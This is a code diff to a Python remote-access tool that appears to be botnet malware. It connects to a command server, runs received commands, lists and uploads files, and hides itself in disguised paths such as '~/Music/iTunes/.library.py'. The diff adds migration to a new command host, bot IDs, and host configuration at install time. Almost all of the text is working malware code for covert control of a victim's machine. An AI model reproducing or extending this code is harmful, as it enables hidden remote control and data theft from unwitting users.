@@ -19,16 +19,19 @@ try:
 except:
     from io import StringIO
 
-__version__ = "0.9.9"
+__version__ = "1.0"
 
 HOST = 'localhost'
 PORT = 1708
-
+HOSTINFOFILE = '.host'
+IDFILE = '.id'
 # Commands
 STDIN = 'stdin'
 EVAL = 'eval'
 CMD = 'cmd'
 KILL_PROC = 'kill'
+HOST_TRANSFER = 'transfer'
+ASSIGN_ID = 'assign'
 # Special
 LS_JSON = 'ls'
 # Client -> Server
@@ -276,23 +279,25 @@ class PayloadLib:
             return True
         return False
 
+
 class WriterWrapper:
     def __init__(self, writefunc):
         self.func = writefunc
     def write(self, wstr):
         self.func(wstr)
 
+
 # Scripts
-def main():
+def main(hostaddr=HOST, hostport=PORT, bid=None):
     while RUNNING:
         if hasInternetConnection():
             try:
                 # Get and send info
                 user, arch = getInfo()
-                infodict = dict(user=user, arch=arch, version=__version__)
+                infodict = dict(user=user, arch=arch, version=__version__, bid=bid)
                 json_str = json.dumps(infodict)
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect((HOST, PORT))
+                s.connect((hostaddr, hostport))
                 sslbyte = s.recv(1)
                 if sslbyte != b'\x00':
                     s = ssl.wrap_socket(s)
@@ -304,6 +309,7 @@ def main():
         if RUNNING:
             # Try again in a minute
             time.sleep(10)
+
 
 proc = None
 def serve(sock):
@@ -356,19 +362,20 @@ def serve(sock):
         while RUNNING:
             recvbytes = sock.recv()
             recvjson = json.loads(recvbytes.decode('UTF-8'))
+
             # Special LS command
             if LS_JSON in recvjson:
                 filedict = {}
                 filepath = os.path.abspath(os.path.expanduser(recvjson[LS_JSON]))
                 if os.path.isdir(filepath):
                     try:
-                        #Throws exception when permission denied on folder
+                        # Throws exception when permission denied on folder
                         ls = os.listdir(filepath)
-                        for f in (os.path.join(filepath, f) for f in ls):
+                        for hostfile in (os.path.join(filepath, f) for f in ls):
                             try:
-                                retstat = os.stat(f)
-                                retval = (os.path.isdir(f), retstat.st_mode, retstat.st_size)
-                                filedict[f] = retval
+                                retstat = os.stat(hostfile)
+                                retval = (os.path.isdir(hostfile), retstat.st_mode, retstat.st_size)
+                                filedict[hostfile] = retval
                             except OSError:
                                 # This can happen if you have really weird files, trust me
                                 pass
@@ -385,7 +392,18 @@ def serve(sock):
                                             stdout=subprocess.PIPE,
                                             stderr=subprocess.PIPE,
                                             cwd=os.path.expanduser("~"))
-
+            if HOST_TRANSFER in recvjson:
+                hostaddr = recvjson[HOST_TRANSFER][0]
+                hostport = int(recvjson[HOST_TRANSFER][1])
+                with open(HOSTINFOFILE,"w") as hostfile:
+                    hostfile.write(hostaddr + "\n")
+                    hostfile.write(str(hostport))
+                # Restart
+                RUNNING = False
+            if ASSIGN_ID in recvjson:
+                id = recvjson[ASSIGN_ID]
+                with open(IDFILE,"w") as idfile:
+                    idfile.write(id)
             # Standard evaluation
             if STDIN in recvjson:
                 with proclock:
@@ -428,13 +446,15 @@ def serve(sock):
             if CLIENT_CLOSE in recvjson and clientobj is not None:
                 clientobj.close()
                 RUNNING = False
-                with proclock:
-                    proc.kill()
-                bytelock.fsock.close()
 
             if FILE_DOWNLOAD in recvjson:
                 filename = recvjson[FILE_DOWNLOAD]
                 payloadlib.upload(filename)
+
+            if not RUNNING:
+                with proclock:
+                    proc.kill()
+                bytelock.fsock.close()
 
     def writeBundles():
         remains = True
@@ -512,7 +532,7 @@ SCRIPT_LOCS = ['~/Music/iTunes/.library.py', '~/.dropbox/.index.py']
 INSTALL_FLAG = '-install'
 
 
-def install():
+def install(hostaddr,hostport):
     # Find python
     proc = subprocess.Popen(["which", "python"], stdout=subprocess.PIPE)
     (out, err) = proc.communicate()
@@ -532,6 +552,10 @@ def install():
                 pass
     if script_path is None:
         return False
+    # Install host information
+    with open(os.path.join(script_path,HOSTINFOFILE),"w") as f:
+        f.write(hostaddr + "\n")
+        f.write(str(hostport))
 
     # Now we have hidden the script
     daemon_loc = None
@@ -550,8 +574,30 @@ def install():
 
 if __name__ == "__main__":
     if INSTALL_FLAG in sys.argv:
-        install()
+        hostaddr = HOST
+        hostport = PORT
+        install_index = sys.argv.index(INSTALL_FLAG)
+        if len(sys.argv) > install_index+2:
+            hostaddr = sys.argv[install_index+1]
+            hostport = sys.argv[install_index+2]
+        install(hostaddr,hostport)
     else:
-        main()
+        hostaddr = HOST
+        hostport = PORT
+        bid = None
+        if os.path.exists(HOSTINFOFILE):
+            with open(HOSTINFOFILE, "r") as f:
+                lines = [s.strip() for s in f.readlines()]
+            try:
+                checkaddr = lines[0]
+                checkport = int(lines[1])
+                hostaddr = checkaddr
+                hostport = checkport
+            except:
+                pass
+        if os.path.exists(IDFILE):
+            with open(IDFILE,"r") as f:
+                bid = f.read()
+        main(hostaddr,hostport,bid)
         if not RUNNING:
             os.execv(sys.executable, [sys.executable] + sys.argv)
